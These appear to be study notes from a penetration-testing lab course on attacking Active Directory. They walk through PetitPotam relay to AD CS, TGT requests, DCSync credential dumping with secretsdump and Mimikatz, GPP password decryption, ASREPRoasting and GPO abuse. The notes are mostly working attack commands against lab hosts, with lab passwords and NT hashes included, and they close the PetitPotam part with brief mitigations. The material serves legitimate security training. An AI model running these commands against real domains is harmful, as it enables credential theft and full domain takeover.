	> PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools(https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
	> This(https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.
	> Let's walk through the attack. First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as certi(https://github.com/zer1t0/certi) to attempt to locate it.
	> Starting ntlmrelayx.py
		m1l0js@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

	> In another window, we can run the tool PetitPotam.py(https://github.com/topotam/PetitPotam). We run this tool with the command python3 PetitPotam.py <attack host IP> <Domain Controller IP> to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.
	> There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>. There is also a PowerShell implementation of the tool Invoke-PetitPotam.ps1 => (https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
	> Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.
	> Running PetitPotam.py
		m1l0js@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                 

	> Catching Base64 Encoded Certificate for DC01
	> Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
	> Catching Base64 Encoded Certificate for DC01
		m1l0js@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

	> Requesting a TGT Using gettgtpkinit.py
	> Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.
	> Requesting a TGT Using gettgtpkinit.py
m1l0js@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6 [SNIP]Gmy= dc01.ccache

	> Setting the KRB5CCNAME Environment Variable
	> The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
	> Setting the KRB5CCNAME Environment Variable
		m1l0js@htb[/htb]$ export KRB5CCNAME=dc01.ccache

	> Using Domain Controller TGT to DCSync
	> We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
	> Using Domain Controller TGT to DCSync
		m1l0js@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

	> We could also use a more straightforward command: secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL because the tool will retrieve the username from the ccache file. We can see this by typing klist (using the klist command requires installation of the krb5-user package on our attack host. This is installed on ATTACK01 in the lab already).
	> Running klist
		m1l0js@htb[/htb]$ klist
		
		Ticket cache: FILE:dc01.ccache
		Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
		
		Valid starting       Expires              Service principal
		04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL

	> Confirming Admin Access to the Domain Controller
	> Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.
	> Confirming Admin Access to the Domain Controller
		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

	> Submitting a TGS Request for Ourselves Using getnthash.py
	> We can also take an alternate route once we have the TGT for our target. Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC => https://stealthbits.com/blog/what-is-the-kerberos-pac/)  which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
	> Submitting a TGS Request for Ourselves Using getnthash.py
		m1l0js@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
			[*] Using TGT from cache
			[*] Requesting ticket to self with PAC
			Recovered NT Hash
			313b6f423cd1ee07e91315b4919fb4ba

	> We can then use this hash to perform a DCSync with secretsdump.py using the -hashes flag.
	> Using Domain Controller NTLM Hash to DCSync
		m1l0js@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

	> Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
	> Note: We would need to use the MS01 attack host in another section, such as the ACL Abuse Tactics or Privileged Access section once we have the base64 certificate saved down to our notes to perform this using Rubeus.
	> Requesting TGT and Performing PTT with DC01$ Machine Account
		PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQI/4gr5ojclZ0CAggAgIIIWEbNG5AHeeAIBHlVEokmojeGyuSqGImFR[SNIP]Ry4= /ptt

	> We can then type klist to confirm that the ticket is in memory.
	> Confirming the Ticket is in Memory
		PS C:\Tools> klist
		Current LogonId is 0:0x4e56b
		
		Cached Tickets: (3)
		
		#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
		        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
		        Start Time: 3/30/2022 15:53:09 (local)
		        End Time:   3/31/2022 1:50:25 (local)
		        Renew Time: 4/6/2022 15:50:25 (local)
		        Session Key Type: RSADSI RC4-HMAC(NT)
		        Cache Flags: 0x2 -> DELEGATION
		        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
		
		#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
		        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
		        Start Time: 3/30/2022 15:50:25 (local)
		        End Time:   3/31/2022 1:50:25 (local)
		        Renew Time: 4/6/2022 15:50:25 (local)
		        Session Key Type: RSADSI RC4-HMAC(NT)
		        Cache Flags: 0x1 -> PRIMARY
		        Kdc Called:
		
		#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
		        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
		        Start Time: 3/30/2022 15:53:09 (local)
		        End Time:   3/31/2022 1:50:25 (local)
		        Renew Time: 4/6/2022 15:50:25 (local)
		        Session Key Type: RSADSI RC4-HMAC(NT)
		        Cache Flags: 0
		        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

	> Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.
	> Performing DCSync with Mimikatz
		PS C:\Tools> cd .\mimikatz\x64\
		PS C:\Tools\mimikatz\x64> .\mimikatz.exe
		mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt

* PetitPotam Mitigations
	> First off, the patch for CVE-2021-36942 should be applied to any affected hosts. Below are some further hardening steps that can be taken:

    		- To prevent NTLM relay attacks, use Extended Protection for Authentication(https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling Require SSL(https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
    		- Disabling NTLM authentication(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
    		- Disabling NTLM on AD CS servers using Group Policy(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
    		- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

	> For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper Certified Pre-Owned(https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.
Recap


* In this section we covered three recent attacks:

    	- NoPac (SamAccountName Spoofing)
    	- PrintNightmare (remotely)
    	- PetitPotam (MS-EFSRPC)

	> Each of these attacks can be performed with either standard domain user access (NoPac) or without any type of authentication to the domain at all (PrintNightmare and PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.

	> In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.

-=-=-=
[+] Miscellaneous Misconfigurations
	> There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.

* Scenario Setup
	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!.

* Exchange Related Group Membership
	> A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo(https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.
	> The Exchange group Organization Management is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.
	> If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.

* PrivExchange
	> The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.
	> The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

* Printer Bug
	> The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.
	> The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.
	> The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

	> We can use tools such as the Get-SpoolStatus module from this(https://github.com/cube0x0/Security-Assessment) tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.
	> Enumerating for MS-PRN Printer Bug
		PS C:\htb> Import-Module .\SecurityAssessment.ps1
		PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
		ComputerName                        Status
		------------                        ------
		ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True

* MS14-068
	> This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.
	> The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the Python Kerberos Exploitation Kit (PyKEK => https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine Mantis on the Hack The Box platform showcases this vulnerability.

* Sniffing LDAP Credentials

	> Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a netcat listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this post => (https://grimhacker.com/2018/03/09/just-a-printer/)

* Enumerating DNS Records

	> We can use a tool such as adidnsdump(https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.
The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post => (https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

	> On the first run of the tool, we can see that some records are blank, namely ?,LOGISTICS,?.
	> Using adidnsdump
		m1l0js@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
	> Viewing the Contents of the records.csv File
		m1l0js@htb[/htb]$ head records.csv 
	> If we run again with the -r flag the tool will attempt to resolve unknown records by performing an A query. Now we can see that an IP address of 172.16.5.240 showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.
	> Using the -r Option to Resolve Unknown Records
		m1l0js@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

* Other Misconfigurations
	> There are many other misconfigurations that can be used to further your access within a domain.

* Password in Description Field
	> To import activedirectory module ==> Install-WindowsFeature RSAT-AD-PowerShell
	> Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.
	> Finding Passwords in the Description Field using Get-Domain User
		PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

* PASSWD_NOTREQD Field
	> It is possible to come across domain accounts with the passwd_notreqd(https://ldapwiki.com/wiki/PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.
	> Checking for PASSWD_NOTREQD Setting using Get-DomainUser
		PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

* Credentials in SMB Shares and SYSVOL Scripts
	> The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.
	> Discovering an Interesting Script
		PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
		Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
		Mode                LastWriteTime         Length Name                                                                 
		----                -------------         ------ ----                                                                 
		-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
		-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
		-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
		-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  

	> Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the --local-auth flag.

* Group Policy Preferences (GPP) Passwords
	> When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
    		- Map drives (drives.xml)
    		- Create local users
    		- Create printer config files (printers.xml)
    		- Creating and updating services (services.xml)
    		- Creating scheduled tasks (scheduledtasks.xml)
    		- Changing local admin passwords.

	> These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
	> This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege(https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
	> The XML looks like the following:
	> Viewing Groups.xml => (https://academy.hackthebox.com/storage/modules/143/GPP.png)
	> If you retrieve the cpassword value more manually, the gpp-decrypt utility can be used to decrypt the password as follows:
	> Decrypting the Password with gpp-decrypt
		m1l0js@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

	> GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1(https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
	> Locating & Retrieving GPP Passwords with CrackMapExec
		m1l0js@htb[/htb]$ crackmapexec smb -L | grep gpp

	> It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the gpp_autologin(https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the Get-GPPAutologon.ps1(https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.
	> Using CrackMapExec's gpp_autologin Module
		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

	> In the output above, we can see that we have retrieved the credentials for an account called guarddesk. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.
	> A theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.

* ASREPRoasting
	> It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
	> With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
	> ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
	> The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.
	> Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.
	> Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
		PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

	> With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.
	> Retrieving AS-REP in Proper Format using Rubeus
		PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

	> We can then crack the hash offline using Hashcat with mode 18200.
	> Cracking the Hash Offline with Hashcat
		m1l0js@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

	> When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
	> Retrieving the AS-REP Using Kerbrute
		m1l0js@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

	> With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberoast pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.
	> Hunting for Users with Kerberoast Pre-auth Not Required
		m1l0js@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

	> We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.

* Group Policy Object (GPO) Abuse
	> Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.
	> GPO misconfigurations can be abused to perform the following attacks:
    		- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
    		- Adding a local admin user to one or more hosts
    		- Creating an immediate scheduled task to perform any number of actions

	> We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use group3r(https://github.com/Group3r/Group3r), ADRecon(https://github.com/sense-of-security/ADRecon), PingCastle(https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
	> Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.
	> Enumerating GPO Names with PowerView
		PS C:\htb> Get-DomainGPO |select displayname

	> This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.
	> Enumerating GPO Names with a Built-In Cmdlet
		PS C:\htb> Get-GPO -All | Select DisplayName

	> Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.
	> Enumerating Domain User GPO Rights
		PS C:\htb> $sid=Convert-NameToSid "Domain Users"
		PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

			ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
			ObjectSID             :
			ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
			                        WriteOwner
			BinaryLength          : 36
			AceQualifier          : AccessAllowed
			IsCallback            : False
			OpaqueLength          : 0
			AccessMask            : 983095
			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
